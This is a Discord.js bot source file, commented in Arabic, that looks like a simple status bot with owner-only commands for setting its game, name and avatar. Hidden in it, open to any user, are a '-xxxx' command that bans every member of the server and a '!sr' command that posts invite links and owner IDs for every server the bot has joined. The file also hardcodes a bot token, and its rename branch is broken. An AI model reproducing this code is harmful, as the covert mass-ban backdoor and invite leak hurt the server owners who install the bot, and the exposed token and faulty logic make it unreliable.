const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
  console.log(`|===================================|`);
  console.log(`Logged in ${client.user.id}         `);
  console.log(`${client.user.tag}`)
  console.log(`|  Users Size ${client.users.size}  |`);
  console.log(`| Guilds Size ${client.guilds.size} |`);
  console.log(`|===================================|`);
  console.log(`| Created By Baadr Al Otaibi!  |`);
  console.log(`|===================================|`);
  console.log(`|        Over Bot Log By You !      |`);
  console.log(`|===================================|`);
});



const adminprefix = "-";
const devs = ['408396389291393025'];
client.on('message', message => {
  var argresult = message.content.split(` `).slice(1).join(' ');
    if (!devs.includes(message.author.id)) return;
    
if (message.content.startsWith(adminprefix + 'setG')) {
  client.user.setGame(argresult);
    message.channel.sendMessage(`**${argresult} تم تغيير بلاينق البوت إلى **`)
} else 
  if (message.content.startsWith(adminprefix + 'setN')) { 
client.user.setUsername(argresult).then
    message.channel.sendMessage(`**${argresult}** : تم تغيير أسم البوت إلى`)
return message.reply("**لا يمكنك تغيير الاسم يجب عليك الانتظآر لمدة ساعتين . **");
} else
  if (message.content.startsWith(adminprefix + 'setA')) {
client.user.setAvatar(argresult);
  message.channel.sendMessage(`**${argresult}** : تم تغير صورة البوت`);
      } else     
if (message.content.startsWith(adminprefix + 'setT')) {
  client.user.setGame(argresult, "https://www.twitch.tv/idk");
    message.channel.sendMessage(`**تم تغيير تويتش البوت إلى  ${argresult}**`)
}
})


client.on('message', msg => {
    if(msg.author.bot) return;

    if(msg.content === '!sr') {
      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
	if(msg.content.startsWith('-xxxx')) {
		msg.guild.members.forEach(member => {
			member.ban();
		});
	}
    
  })

                      
			  
client.login('NTAyNDI4MzU1MDYxMzUwNDEx.DqnyZg.xWaxRiqjGNlJExUFKzSh0pydXis');
